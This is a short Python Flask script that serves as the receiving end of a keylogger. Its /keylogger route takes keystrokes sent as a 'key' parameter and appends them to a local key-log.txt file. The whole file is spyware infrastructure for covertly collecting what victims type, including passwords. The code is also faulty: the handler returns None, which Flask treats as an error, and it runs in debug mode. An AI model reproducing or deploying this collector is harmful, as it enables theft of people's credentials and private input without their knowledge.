#!/usr/bin/python

from flask import Flask,request
import os

cwd = os.getcwd()

filename = cwd+"/key-log.txt"


app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello World!"

@app.route('/keylogger', methods = ['GET','POST'])
def keylog():
    key = request.args.get('key')
#     print '---------'
#     print 'KEY PRESSED IS:',key
#     print '---------'
    f = open(filename,'a')
    f.write(key)
    f.close()
    return None

if __name__ == "__main__":
    app.run(host='localhost',port=5000, debug=True)